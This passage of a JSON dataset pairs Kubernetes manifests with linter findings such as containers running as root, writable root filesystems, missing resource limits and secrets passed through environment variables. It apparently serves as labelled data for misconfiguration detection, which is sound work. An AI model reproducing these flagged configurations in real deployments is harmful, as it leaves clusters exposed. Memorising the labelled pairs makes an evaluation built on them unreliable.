    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20190615-f3db6c682\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "03532",
    "manifest_path": "data/manifests/the_stack_sample/sample_1550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: demogaurav.azurecr.io/blue-nginx:1\n        ports:\n        - name: http\n          containerPort: 80\n        resources:\n          requests:\n            cpu: 200m\n            memory: 200Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03533",
    "manifest_path": "data/manifests/the_stack_sample/sample_1550.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: demogaurav.azurecr.io/blue-nginx:1\n        ports:\n        - name: http\n          containerPort: 80\n        resources:\n          requests:\n            cpu: 200m\n            memory: 200Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03534",
    "manifest_path": "data/manifests/the_stack_sample/sample_1552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: frontend\nspec:\n  containers:\n  - name: app\n    image: images.my-company.example/app:v4\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 128Mi\n        cpu: 500m\n  - name: log-aggregator\n    image: images.my-company.example/log-aggregator:v6\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 128Mi\n        cpu: 500m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "03535",
    "manifest_path": "data/manifests/the_stack_sample/sample_1552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: frontend\nspec:\n  containers:\n  - name: app\n    image: images.my-company.example/app:v4\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 128Mi\n        cpu: 500m\n  - name: log-aggregator\n    image: images.my-company.example/log-aggregator:v6\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 128Mi\n        cpu: 500m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"log-aggregator\" does not have a read-only root file system"
  },
  {
    "id": "03536",
    "manifest_path": "data/manifests/the_stack_sample/sample_1552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: frontend\nspec:\n  containers:\n  - name: app\n    image: images.my-company.example/app:v4\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 128Mi\n        cpu: 500m\n  - name: log-aggregator\n    image: images.my-company.example/log-aggregator:v6\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 128Mi\n        cpu: 500m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "03537",
    "manifest_path": "data/manifests/the_stack_sample/sample_1552.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: frontend\nspec:\n  containers:\n  - name: app\n    image: images.my-company.example/app:v4\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 128Mi\n        cpu: 500m\n  - name: log-aggregator\n    image: images.my-company.example/log-aggregator:v6\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 128Mi\n        cpu: 500m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"log-aggregator\" is not set to runAsNonRoot"
  },
  {
    "id": "03538",
    "manifest_path": "data/manifests/the_stack_sample/sample_1555.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notification\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: notification\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: notification\n        version: v1\n    spec:\n      containers:\n      - name: notification\n        image: stocktradersjilv2/notification:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: MQ_USR\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: user\n        - name: MQ_PWD\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: password\n        - name: MQ_VIRTUAL_HOST\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: vhost\n        - name: MQ_HOST_NAME\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: host\n        - name: MQ_PORT\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: port\n        - name: MQ_QUEUE\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: queue\n        - name: TENANT_ID\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: tenenatid\n        - name: API_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: apikey\n        - name: REGION\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: region\n        - name: TAG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: tag\n        - name: ALERT_MSG_URL\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: alertmsgurl\n        resources:\n          requests:\n            cpu: 200m\n            memory: 300Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"notification\" is using an invalid container image, \"stocktradersjilv2/notification:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03539",
    "manifest_path": "data/manifests/the_stack_sample/sample_1555.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notification\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: notification\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: notification\n        version: v1\n    spec:\n      containers:\n      - name: notification\n        image: stocktradersjilv2/notification:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: MQ_USR\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: user\n        - name: MQ_PWD\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: password\n        - name: MQ_VIRTUAL_HOST\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: vhost\n        - name: MQ_HOST_NAME\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: host\n        - name: MQ_PORT\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: port\n        - name: MQ_QUEUE\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: queue\n        - name: TENANT_ID\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: tenenatid\n        - name: API_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: apikey\n        - name: REGION\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: region\n        - name: TAG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: tag\n        - name: ALERT_MSG_URL\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: alertmsgurl\n        resources:\n          requests:\n            cpu: 200m\n            memory: 300Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"notification\" does not have a read-only root file system"
  },
  {
    "id": "03540",
    "manifest_path": "data/manifests/the_stack_sample/sample_1555.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notification\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: notification\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: notification\n        version: v1\n    spec:\n      containers:\n      - name: notification\n        image: stocktradersjilv2/notification:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: MQ_USR\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: user\n        - name: MQ_PWD\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: password\n        - name: MQ_VIRTUAL_HOST\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: vhost\n        - name: MQ_HOST_NAME\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: host\n        - name: MQ_PORT\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: port\n        - name: MQ_QUEUE\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: queue\n        - name: TENANT_ID\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: tenenatid\n        - name: API_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: apikey\n        - name: REGION\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: region\n        - name: TAG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: tag\n        - name: ALERT_MSG_URL\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: alertmsgurl\n        resources:\n          requests:\n            cpu: 200m\n            memory: 300Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"notification\" is not set to runAsNonRoot"
  },
  {
    "id": "03541",
    "manifest_path": "data/manifests/the_stack_sample/sample_1555.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notification\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: notification\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: notification\n        version: v1\n    spec:\n      containers:\n      - name: notification\n        image: stocktradersjilv2/notification:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: MQ_USR\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: user\n        - name: MQ_PWD\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: password\n        - name: MQ_VIRTUAL_HOST\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: vhost\n        - name: MQ_HOST_NAME\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: host\n        - name: MQ_PORT\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: port\n        - name: MQ_QUEUE\n          valueFrom:\n            secretKeyRef:\n              name: rbq\n              key: queue\n        - name: TENANT_ID\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: tenenatid\n        - name: API_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: apikey\n        - name: REGION\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: region\n        - name: TAG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: tag\n        - name: ALERT_MSG_URL\n          valueFrom:\n            secretKeyRef:\n              name: ibmcloudpush\n              key: alertmsgurl\n        resources:\n          requests:\n            cpu: 200m\n            memory: 300Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"notification\" has memory limit 0"
  },
  {
    "id": "03542",
    "manifest_path": "data/manifests/the_stack_sample/sample_1556.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nulog-inference-service\n  namespace: opni-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nulog-inference-service\n  template:\n    metadata:\n      labels:\n        app: nulog-inference-service\n    spec:\n      containers:\n      - name: nulog-inference-service\n        image: rancher/opni-inference-service:v0.1.1\n        imagePullPolicy: Always\n        env:\n        - name: NATS_SERVER_URL\n          value: nats://nats_client:%NATS_PASSWORD%@nats-client.opni-system.svc:4222\n        - name: ES_ENDPOINT\n          value: https://opendistro-es-client-service.opni-system.svc.cluster.local:9200\n        - name: MINIO_ENDPOINT\n          value: http://minio.opni-system.svc.cluster.local:9000\n        - name: MINIO_ACCESS_KEY\n          value: '%MINIO_ACCESS_KEY%'\n        - name: MINIO_SECRET_KEY\n          value: '%MINIO_SECRET_KEY%'\n        - name: MODEL_THRESHOLD\n          value: '0.5'\n        - name: MIN_LOG_TOKENS\n          value: '5'\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MINIO_SECRET_KEY in container \"nulog-inference-service\" found"
  },
  {
    "id": "03543",
    "manifest_path": "data/manifests/the_stack_sample/sample_1556.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nulog-inference-service\n  namespace: opni-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nulog-inference-service\n  template:\n    metadata:\n      labels:\n        app: nulog-inference-service\n    spec:\n      containers:\n      - name: nulog-inference-service\n        image: rancher/opni-inference-service:v0.1.1\n        imagePullPolicy: Always\n        env:\n        - name: NATS_SERVER_URL\n          value: nats://nats_client:%NATS_PASSWORD%@nats-client.opni-system.svc:4222\n        - name: ES_ENDPOINT\n          value: https://opendistro-es-client-service.opni-system.svc.cluster.local:9200\n        - name: MINIO_ENDPOINT\n          value: http://minio.opni-system.svc.cluster.local:9000\n        - name: MINIO_ACCESS_KEY\n          value: '%MINIO_ACCESS_KEY%'\n        - name: MINIO_SECRET_KEY\n          value: '%MINIO_SECRET_KEY%'\n        - name: MODEL_THRESHOLD\n          value: '0.5'\n        - name: MIN_LOG_TOKENS\n          value: '5'\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nulog-inference-service\" does not have a read-only root file system"
  },
  {
    "id": "03544",
    "manifest_path": "data/manifests/the_stack_sample/sample_1556.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nulog-inference-service\n  namespace: opni-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nulog-inference-service\n  template:\n    metadata:\n      labels:\n        app: nulog-inference-service\n    spec:\n      containers:\n      - name: nulog-inference-service\n        image: rancher/opni-inference-service:v0.1.1\n        imagePullPolicy: Always\n        env:\n        - name: NATS_SERVER_URL\n          value: nats://nats_client:%NATS_PASSWORD%@nats-client.opni-system.svc:4222\n        - name: ES_ENDPOINT\n          value: https://opendistro-es-client-service.opni-system.svc.cluster.local:9200\n        - name: MINIO_ENDPOINT\n          value: http://minio.opni-system.svc.cluster.local:9000\n        - name: MINIO_ACCESS_KEY\n          value: '%MINIO_ACCESS_KEY%'\n        - name: MINIO_SECRET_KEY\n          value: '%MINIO_SECRET_KEY%'\n        - name: MODEL_THRESHOLD\n          value: '0.5'\n        - name: MIN_LOG_TOKENS\n          value: '5'\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nulog-inference-service\" is not set to runAsNonRoot"
  },
  {
    "id": "03545",
    "manifest_path": "data/manifests/the_stack_sample/sample_1556.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nulog-inference-service\n  namespace: opni-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nulog-inference-service\n  template:\n    metadata:\n      labels:\n        app: nulog-inference-service\n    spec:\n      containers:\n      - name: nulog-inference-service\n        image: rancher/opni-inference-service:v0.1.1\n        imagePullPolicy: Always\n        env:\n        - name: NATS_SERVER_URL\n          value: nats://nats_client:%NATS_PASSWORD%@nats-client.opni-system.svc:4222\n        - name: ES_ENDPOINT\n          value: https://opendistro-es-client-service.opni-system.svc.cluster.local:9200\n        - name: MINIO_ENDPOINT\n          value: http://minio.opni-system.svc.cluster.local:9000\n        - name: MINIO_ACCESS_KEY\n          value: '%MINIO_ACCESS_KEY%'\n        - name: MINIO_SECRET_KEY\n          value: '%MINIO_SECRET_KEY%'\n        - name: MODEL_THRESHOLD\n          value: '0.5'\n        - name: MIN_LOG_TOKENS\n          value: '5'\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nulog-inference-service\" has cpu request 0"
  },
  {
    "id": "03546",
    "manifest_path": "data/manifests/the_stack_sample/sample_1556.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nulog-inference-service\n  namespace: opni-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nulog-inference-service\n  template:\n    metadata:\n      labels:\n        app: nulog-inference-service\n    spec:\n      containers:\n      - name: nulog-inference-service\n        image: rancher/opni-inference-service:v0.1.1\n        imagePullPolicy: Always\n        env:\n        - name: NATS_SERVER_URL\n          value: nats://nats_client:%NATS_PASSWORD%@nats-client.opni-system.svc:4222\n        - name: ES_ENDPOINT\n          value: https://opendistro-es-client-service.opni-system.svc.cluster.local:9200\n        - name: MINIO_ENDPOINT\n          value: http://minio.opni-system.svc.cluster.local:9000\n        - name: MINIO_ACCESS_KEY\n          value: '%MINIO_ACCESS_KEY%'\n        - name: MINIO_SECRET_KEY\n          value: '%MINIO_SECRET_KEY%'\n        - name: MODEL_THRESHOLD\n          value: '0.5'\n        - name: MIN_LOG_TOKENS\n          value: '5'\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nulog-inference-service\" has memory limit 0"
  },
  {
    "id": "03547",
    "manifest_path": "data/manifests/the_stack_sample/sample_1558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: glusterfs\nspec:\n  containers:\n  - name: glusterfs\n    image: nginx\n    volumeMounts:\n    - mountPath: /mnt/glusterfs\n      name: glusterfsvol\n  volumes:\n  - name: glusterfsvol\n    glusterfs:\n      endpoints: glusterfs-cluster\n      path: kube_vol\n      readOnly: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"glusterfs\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03548",
    "manifest_path": "data/manifests/the_stack_sample/sample_1558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: glusterfs\nspec:\n  containers:\n  - name: glusterfs\n    image: nginx\n    volumeMounts:\n    - mountPath: /mnt/glusterfs\n      name: glusterfsvol\n  volumes:\n  - name: glusterfsvol\n    glusterfs:\n      endpoints: glusterfs-cluster\n      path: kube_vol\n      readOnly: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"glusterfs\" does not have a read-only root file system"
  },
  {
    "id": "03549",
    "manifest_path": "data/manifests/the_stack_sample/sample_1558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: glusterfs\nspec:\n  containers:\n  - name: glusterfs\n    image: nginx\n    volumeMounts:\n    - mountPath: /mnt/glusterfs\n      name: glusterfsvol\n  volumes:\n  - name: glusterfsvol\n    glusterfs:\n      endpoints: glusterfs-cluster\n      path: kube_vol\n      readOnly: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"glusterfs\" is not set to runAsNonRoot"
  },
  {
    "id": "03550",
    "manifest_path": "data/manifests/the_stack_sample/sample_1558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: glusterfs\nspec:\n  containers:\n  - name: glusterfs\n    image: nginx\n    volumeMounts:\n    - mountPath: /mnt/glusterfs\n      name: glusterfsvol\n  volumes:\n  - name: glusterfsvol\n    glusterfs:\n      endpoints: glusterfs-cluster\n      path: kube_vol\n      readOnly: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"glusterfs\" has cpu request 0"
  },
  {
    "id": "03551",
    "manifest_path": "data/manifests/the_stack_sample/sample_1558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: glusterfs\nspec:\n  containers:\n  - name: glusterfs\n    image: nginx\n    volumeMounts:\n    - mountPath: /mnt/glusterfs\n      name: glusterfsvol\n  volumes:\n  - name: glusterfsvol\n    glusterfs:\n      endpoints: glusterfs-cluster\n      path: kube_vol\n      readOnly: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"glusterfs\" has memory limit 0"
  },
  {
    "id": "03552",
    "manifest_path": "data/manifests/the_stack_sample/sample_1568.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes18\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume-storageos\n    storageos:\n      volumeName: test\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03553",
    "manifest_path": "data/manifests/the_stack_sample/sample_1568.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes18\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume-storageos\n    storageos:\n      volumeName: test\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03554",
    "manifest_path": "data/manifests/the_stack_sample/sample_1568.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes18\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume-storageos\n    storageos:\n      volumeName: test\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "03555",
    "manifest_path": "data/manifests/the_stack_sample/sample_1568.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes18\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume-storageos\n    storageos:\n      volumeName: test\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "03556",
    "manifest_path": "data/manifests/the_stack_sample/sample_1568.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes18\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume-storageos\n    storageos:\n      volumeName: test\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "03557",
    "manifest_path": "data/manifests/the_stack_sample/sample_1568.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes18\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume-storageos\n    storageos:\n      volumeName: test\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "03558",
    "manifest_path": "data/manifests/the_stack_sample/sample_1568.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes18\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume-storageos\n    storageos:\n      volumeName: test\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "03559",
    "manifest_path": "data/manifests/the_stack_sample/sample_1568.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes18\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  volumes:\n  - name: volume-storageos\n    storageos:\n      volumeName: test\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "03560",
    "manifest_path": "data/manifests/the_stack_sample/sample_1571.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.62\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10249\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=default/default-http-backend\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-ingress-lb\" does not have a read-only root file system"
  },
  {
    "id": "03561",
    "manifest_path": "data/manifests/the_stack_sample/sample_1571.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.62\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10249\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=default/default-http-backend\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-ingress-lb\" is not set to runAsNonRoot"
  },
  {
    "id": "03562",
    "manifest_path": "data/manifests/the_stack_sample/sample_1571.yaml",
